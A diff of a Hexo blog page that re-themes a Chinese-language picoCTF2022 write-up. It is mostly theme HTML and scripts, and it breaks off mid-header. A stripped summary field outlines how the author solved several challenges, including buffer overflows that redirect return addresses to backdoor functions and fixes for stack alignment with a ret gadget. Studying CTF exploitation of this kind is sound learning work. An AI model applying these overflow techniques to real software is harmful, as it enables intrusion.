@@ -1,299 +1,213 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-
-
-
-
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-
-  <meta name="author" content="John Doe">
-
-
-
-
-
-<title>picoCTF2022 | Hexo</title>
-
-
-
-<link rel="icon" href="/favicon.png">
-
-
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/nprogress/nprogress.css">
-
-
-
-<script src="/lib/jquery.min.js"></script>
-
-
-<script src="/lib/iconify-icon.min.js"></script>
-
-
-<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
-<script>
-  tailwind.config = {
-    darkMode: "class",
-  };
-</script>
-
-
-<script src="/lib/nprogress/nprogress.js"></script>
-
-<script>
-  $(document).ready(() => {
-    NProgress.configure({
-      showSpinner: false,
-    });
-    NProgress.start();
-    $("#nprogress .bar").css({
-      background: "#de7441",
-    });
-    $("#nprogress .peg").css({
-      "box-shadow": "0 0 2px #de7441, 0 0 4px #de7441",
-    });
-    $("#nprogress .spinner-icon").css({
-      "border-top-color": "#de7441",
-      "border-left-color": "#de7441",
-    });
-    setTimeout(function () {
-      NProgress.done();
-      $(".fade").removeClass("out");
-    }, 800);
-  });
-</script>
-
-<script>
-  (function () {
-    const prefersDark =
-      window.matchMedia &&
-      window.matchMedia("(prefers-color-scheme: dark)").matches;
-    const setting = localStorage.getItem("hexo-color-scheme") || "auto";
-    if (setting === "dark" || (prefersDark && setting !== "light"))
-      document.documentElement.classList.toggle("dark", true);
-    let isDark = document.documentElement.classList.contains("dark");
-  })();
-
-  $(document).ready(function () {
-    // init icon
-    const prefersDark =
-      window.matchMedia &&
-      window.matchMedia("(prefers-color-scheme: dark)").matches;
-    const isDark = document.documentElement.classList.contains("dark");
-    $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
-
-    function toggleGiscusTheme() {
-      const isDark = document.documentElement.classList.contains("dark");
-      const giscusFrame = document.querySelector("iframe.giscus-frame");
-      if (giscusFrame) {
-        giscusFrame.contentWindow.postMessage(
-          {
-            giscus: {
-              setConfig: {
-                theme: isDark ? "dark" : "light",
-              },
-            },
-          },
-          "https://giscus.app"
-        );
-      }
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>picoCTF2022 | Hexo</title><meta name="keywords" content="WP"><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="picoCTF2022"><meta name="application-name" content="picoCTF2022"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="picoCTF2022"><meta property="og:url" content="http://example.com/2025/07/10/picoCTF2022/index.html"><meta property="og:site_name" content="Hexo"><meta property="og:description" content="CRYPTOVigenere题目信息 key CYLAB cipher:  rgnoDVD&amp;#123;O0NU_WQ3_G1G3O3T3_A1AH3S_cc82272b&amp;#125; 题目给了密文和密钥，用随波逐流打开，解密，发现是维吉尼亚加密  flag:picoCTF{D0NT_US3_V1G3N"><meta property="og:locale" content="en"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="John Doe"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="CRYPTOVigenere题目信息 key CYLAB cipher:  rgnoDVD&amp;#123;O0NU_WQ3_G1G3O3T3_A1AH3S_cc82272b&amp;#125; 题目给了密文和密钥，用随波逐流打开，解密，发现是维吉尼亚加密  flag:picoCTF{D0NT_US3_V1G3N"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2025/07/10/picoCTF2022/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"Author: John Doe","link":"Link: ","source":"Source: Hexo","info":"Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.","copySuccess":"Copy success, copy and reprint please mark the address of this article"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
     }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Hexo',
+  title: 'picoCTF2022',
+  postAI: '',
+  pageFillDescription: 'CRYPTO, Vigenere, basic-mod1, substitution0, RE, Safe Opener, GDB test, fresh-java, file-run1, file-run2, Bbbbloat, unpackme, PWN, RPS, 脚本, basic-file-exploit 漏洞, buffer overflow 0, 脚本, buffer overflow 1, 脚本, buffer overflow 2, gdb动调查看, 脚本, x-sixty-what, 堆栈平衡, 脚本题目信息题目给了密文和密钥用随波逐流打开解密发现是维吉尼亚加密题目信息描述我们发现这个奇怪的消息在服务器上传递我们认为我们有一个有效的方案取每个数字并将其映射到以下字符集是字母表大写是十进制数字是下划线以标志格式包装解密的消息即数字按照题目信息对取模厚的数字根据其码修改并转化为字符输出题目信息描述一条消息进来了但似乎全都乱七八糟幸运的是它似乎一开始就有钥匙你能破解这个替换密码吗密文解密猜测密钥凯撒密码加密把第一句作为密钥题目信息描述你能打开这个保险箱吗我忘记了保险箱的钥匙但这个程序应该可以帮助我找回丢失的钥匙你能帮我打开保险箱吗将您恢复的密码放入标志格式例如代码的编码器对密码进行加密调用方法进行核对加密后的结果正如代码中的注释一样用户输入密码进行编码调用函数检验编码厚的数值是否符合指定字符所以密码就是指定字符解码题目信息你能得到这面旗帜吗以下是试用说明解密按照给的命令进行操作题目信息你能得到这面旗帜吗对这个程序进行逆向工程用打开这个文件发现该密文已将被定义好了题目信息已为您提供一个程序如果您尝试在命令行上运行它会发生什么解密首先要为程序赋权限运行该程序并且执行命令题目信息另一个程序但这一次它似乎需要一些输入如果您尝试在命令行上运行它并输入会发生什么情况解密首先要为程序赋权限运行该程序并且执行命令题目信息你能得到这面旗帜吗对这个二进制文件进行逆向工程解密分析得到最喜欢的是数字应该为为文件赋权限运行程序题目描述你能得到这面旗帜吗对这个二进制文件进行逆向工程解密文件以结尾尝试脱壳之后拖入中发现最喜爱的数字是题目描述这是一个对你玩石头剪刀布的程序我听说如果你连续赢了次就会发生好事可以下载带有标记已编辑的程序源代码这里解密主函数前面那些都不重要判断胜负判断胜负电脑的出拳设计校验确保在个手势中随机选择一个核验我们所出的是否包含胜利所需要底色那个手势所以我们要经过次循环且每次循环都要向程序输出的结合脚本漏洞题目信息提供的程序允许您写入文件并从中读取您写入的内容试着玩弄它看看你是否能打破它可以下载带有标记已编辑的程序源代码这里解密有分析可得用来校验空输入等基本校验工作数据输入数据读取且其中包含的输出由可以知道首先选择要进行的模式且第一次必须先存入否则无法调用函数尝试将字符串的开头部分解析成一个十进制的长整型数值所以重点就是的输出结果为题目信息让我们从简单的开始你能溢出正确的缓冲区吗该程序可在此处获得您可以查看源代码这里解密主函数当程序发生段错误即收到信号也就是时不执行默认操作崩溃而是跳转到你定义的函数进行处理当你的程序试图访问非法内存地址如未分配的内存只读内存已释放的内存等时操作系统会发送这个信号给程序默认情况下收到会导致程序崩溃段错误示例触发原因解引用空指针写入常量字符串越界访问栈数组堆数组使用未初始化的指针这个对文件的操作相当于后门函数它包含了读取并把输出在终端而在系统中是一个指向系统默认如的可执行文件函数该函数会输出所以只需要实现就可以输出脚本题目描述控制退货地址现在我们开始烹饪了您可以溢出缓冲区并返回到程序中的函数你可以在这里查看源代码解密是什么在汇编或反编译工具如中是一个由工具自动生成的名称用于表示一个位于栈上的局部变量它通常是原始代码中没有明确命名的变量或者是编译器为了优化或内部使用而创建的栈空间从图片中可以看到位于数组的下方在栈帧中局部变量通常从往下分配有多大图片中对应的汇编指令是在汇编中是的缩写在位系统中一个是字节因此的大小是字节所以垃圾字节要填充个字节是后门函数填充它的地址脚本题目描述控制返回地址和参数这一次您需要控制您返回的函数的参数您可以从此程序中获取标志吗你可以在这里查看源代码解密距离返回地址是个字节要传参位是参数从右到左依次压入栈中的地址动调查看执行的函数列表脚本本地远程题目描述溢出代码在此之前的大多数问题是位现在我们考虑位它只是有点不同使缓冲区溢出并将返回地址更改为函数下载源代码解密这一题我错了很久最后发现考了堆栈平衡但是也学到了一些调试获取信息的方法调试获得相关信息显示所有函数的信息在调试之前显示函数的信息找要填充的字节数位时是位时是堆栈平衡同一个程序的每一个指令执行时栈指针的绝对值不一定相同但其对齐状态是保持一致的当函数通过指令跳转到函数时函数的入口处栈指针可能满足即字节对齐但是函数的序言通常会将压栈这会使减去字节导致字节不对齐问题就出在这里在执行任何指令之前必须是字节对齐的所以该函数到之前要先到小工具使用推荐在终端中运行确保你的可执行文件在当前目录它会列出所有独立的指令地址通常你可以选择其中一个地址最小的或者你觉得独立的地址例如不在任何重要函数的中间是一个非常常见的备选在中手动查找启动调试然后使用命令查找指令的机器码你也可以使用来反汇编整个代码段然后手动查找直接看出堆栈不平衡该函数是被调用函数输出所以在函数中的第一个的地方下断点你的脚本文件名运行脚本查看的寄存器信息看最后两位可以整除所以现在堆栈平衡了脚本之前找到的函数地址在你的二进制文件中找到一个小工具的地址假设你找到的是请替换为你在中找到的实际地址构建填充',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-07-14 15:25:49',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-    // toggle dark mode
-    function toggleDark() {
-      let isDark = document.documentElement.classList.contains("dark");
-      const setting = localStorage.getItem("hexo-color-scheme") || "auto";
-      isDark = !isDark;
-      document.documentElement.classList.toggle("dark", isDark);
-      $("#theme-icon").attr("icon", isDark ? "ri:moon-line" : "ri:sun-line");
-      if (prefersDark === isDark) {
-        localStorage.setItem("hexo-color-scheme", "auto");
-      } else {
-        localStorage.setItem("hexo-color-scheme", isDark ? "dark" : "light");
-      }
-      toggleGiscusTheme();
-    }
-
-    // listen dark mode change
-    window
-      .matchMedia("(prefers-color-scheme: dark)")
-      .addEventListener("change", (e) => {
-        const setting = localStorage.getItem("hexo-color-scheme") || "auto";
-        if (setting === "auto") {
-          document.documentElement.classList.toggle("dark", e.matches);
-          $("#theme-icon").attr(
-            "icon",
-            e.matches ? "ri:moon-line" : "ri:sun-line"
-          );
-          toggleGiscusTheme();
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
         }
-      });
-
-    $("#toggle-dark").click((event) => {
-      const isAppearanceTransition = document.startViewTransition && !window.matchMedia('(prefers-reduced-motion: reduce)').matches
-      if (!isAppearanceTransition) {
-        toggleDark()
-        return
       }
-      const x = event.clientX
-      const y = event.clientY
-      const endRadius = Math.hypot(
-        Math.max(x, innerWidth - x),
-        Math.max(y, innerHeight - y),
-      )
-      const transition = document.startViewTransition(async () => {
-        toggleDark()
-      })
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
 
-      transition.ready
-        .then(() => {
-          const isDark = document.documentElement.classList.contains("dark")
-          const clipPath = [
-            `circle(0px at ${x}px ${y}px)`,
-            `circle(${endRadius}px at ${x}px ${y}px)`,
-          ]
-          document.documentElement.animate(
-            {
-              clipPath: isDark
-                ? [...clipPath].reverse()
-                : clipPath,
-            },
-            {
-              duration: 400,
-              easing: 'ease-out',
-              pseudoElement: isDark
-                ? '::view-transition-old(root)'
-                : '::view-transition-new(root)',
-            },
-          )
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
         })
-    });
-  });
-</script>
 
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
 
-
-
-<meta name="generator" content="Hexo 7.3.0"></head>
-<body class="font-sans bg-white dark:bg-zinc-900 text-gray-700 dark:text-gray-200 relative">
-  <header class="fixed w-full px-5 py-1 z-10 backdrop-blur-xl backdrop-saturate-150 border-b border-black/5">
-  <div class="max-auto">
-    <nav class="flex items-center text-base">
-      <a href="/" class="group">
-        <h2 class="font-medium tracking-tighterp text-l p-2">
-          <img class="w-5 mr-2 inline-block transition-transform group-hover:rotate-[30deg]" id="logo" src="/images/avatar.jpg" alt="Hexo" />
-          Hexo
-        </h2>
-      </a>
-      <div id="header-title" class="opacity-0 md:ml-2 md:mt-[0.1rem] text-xs font-medium whitespace-nowrap overflow-hidden overflow-ellipsis">
-        picoCTF2022
-      </div>
-      <div class="flex-1"></div>
-      <div class="flex items-center gap-3">
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
         
-          <a class="hidden sm:flex" href="/archives">Posts</a>
-        
-          <a class="hidden sm:flex" href="/categories">Categories</a>
-        
-          <a class="hidden sm:flex" href="/tags">Tags</a>
-        
-        
-          
-        
-        <a class="w-5 h-5 hidden sm:flex" title="" href="rss2.xml">
-          <iconify-icon width="20" icon="ri:rss-line"></iconify-icon>
-        </a>
-        <a class="w-5 h-5" title="toggle theme" id="toggle-dark">
-          <iconify-icon width="20" icon="" id="theme-icon"></iconify-icon>
-        </a>
-      </div>
-      <div class="flex items-center justify-center gap-3 ml-3 sm:hidden">
-        <span class="w-5 h-5" aria-hidden="true" role="img" id="open-menu">
-          <iconify-icon width="20" icon="carbon:menu" ></iconify-icon>
-        </span>
-        <span class="w-5 h-5 hidden" aria-hidden="true" role="img" id="close-menu">
-          <iconify-icon  width="20" icon="carbon:close" ></iconify-icon>
-        </span>
-      </div>
-    </nav>
-  </div>
-</header>
-<div id="menu-panel" class="h-0 overflow-hidden sm:hidden fixed left-0 right-0 top-12 bottom-0 z-10">
-  <div id="menu-content" class="relative z-20 bg-white/80 px-6 sm:px-8 py-2 backdrop-blur-xl -translate-y-full transition-transform duration-300">
-    <ul class="nav flex flex-col sm:flex-row text-sm font-medium">
-      
-        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
-          <a href="/archives" class="flex h-12 sm:h-auto items-center">Posts</a>
-        </li>
-      
-        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
-          <a href="/categories" class="flex h-12 sm:h-auto items-center">Categories</a>
-        </li>
-      
-        <li class="nav-portfolio sm:mx-2 border-b sm:border-0 border-black/5 last:border-0 hover:text-main">
-          <a href="/tags" class="flex h-12 sm:h-auto items-center">Tags</a>
-        </li>
-      
-    </ul>
-  </div>
-  <div class="mask bg-black/20 absolute inset-0"></div>
-</div>
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
 
-  <main class="pt-14">
-    <!-- css -->
-
-<link rel="stylesheet" href="/lib/fancybox/fancybox.min.css">
-
-
-<link rel="stylesheet" href="/lib/tocbot/tocbot.min.css">
-
-<!-- toc -->
-
-  <!-- tocbot -->
-<nav class="post-toc toc text-sm w-48 relative top-32 right-0 opacity-70 hidden lg:block" style="position: fixed !important;"></nav>
-
-
-<section class="px-6 max-w-prose mx-auto md:px-0">
-  <!-- header -->
-  <header class="overflow-hidden pt-6 pb-6 md:pt-12">
-    <div class="pt-4 md:pt-6">
-      <h1 id="article-title" class="text-[2rem] font-bold leading-snug mb-4 md:mb-6 md:text-[2.6rem]">
-        picoCTF2022
-      </h1>
-      <div>
-        <section class="flex items-center gap-3 text-sm">
-          <span class="flex items-center gap-1">
-            <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
-            <time>2025-07-14</time>
-          </span>
-          <span class="text-gray-400">·</span>
-          <span class="flex items-center gap-1">
-            <iconify-icon width="18" icon="ic:round-access-alarm" ></iconify-icon>
-            <span>14 min</span>
-          </span>
-          <span class="text-gray-400">·</span>
-          <span class="flex items-center gap-1">
-            <iconify-icon width="18" icon="icon-park-outline:font-search" ></iconify-icon>
-            <span>3.3k words</span>
-          </span>
-          
-        </section>
-      </div>
-    </div>
-  </header>
-  <!-- content -->
-  <article class="post-content prose m-auto slide-enter-content dark:prose-invert">
-    <h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h3><p>题目信息</p>
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Hexo</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> Newest Comments</span></div><div class="aside-list"><span>loading...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/BUU/" style="font-size: 1.05rem;">BUU<sup>4</sup></a><a href="/tags/NSS/" style="font-size: 1.05rem;">NSS<sup>3</sup></a><a href="/tags/PWN/" style="font-size: 1.05rem;">PWN<sup>4</sup></a><a href="/tags/RC4/" style="font-size: 1.05rem;">RC4<sup>1</sup></a><a href="/tags/RC4%E5%8F%98%E5%BC%8F/" style="font-size: 1.05rem;">RC4变式<sup>1</sup></a><a href="/tags/RE/" style="font-size: 1.05rem;">RE<sup>3</sup></a><a href="/tags/SMC/" style="font-size: 1.05rem;">SMC<sup>1</sup></a><a href="/tags/TEA/" style="font-size: 1.05rem;">TEA<sup>1</sup></a><a href="/tags/WP/" style="font-size: 1.05rem;">WP<sup>2</sup></a><a href="/tags/printf/" style="font-size: 1.05rem;">printf<sup>1</sup></a><a href="/tags/pwn-study/" style="font-size: 1.05rem;">pwn_study<sup>3</sup></a><a href="/tags/ret2libc-printf/" style="font-size: 1.05rem;">ret2libc_printf<sup>1</sup></a><a href="/tags/%E5%8A%A8%E8%B0%83/" style="font-size: 1.05rem;">动调<sup>1</sup></a><a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 1.05rem;">栈溢出<sup>1</sup></a><a href="/tags/%E7%8C%9C%E6%95%B0/" style="font-size: 1.05rem;">猜数<sup>1</sup></a><a href="/tags/%E8%8A%B1%E6%8C%87%E4%BB%A4/" style="font-size: 1.05rem;">花指令<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>Archives</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/07/"><span class="card-archive-list-date">July 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/03/"><span class="card-archive-list-date">March 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/WP/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>WP</span></a></span></div></div><h1 class="post-title" itemprop="name headline">picoCTF2022</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-07-10T04:06:13.000Z" title="Created 2025-07-10 12:06:13">2025-07-10</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-07-14T07:25:49.743Z" title="Updated 2025-07-14 15:25:49">2025-07-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div 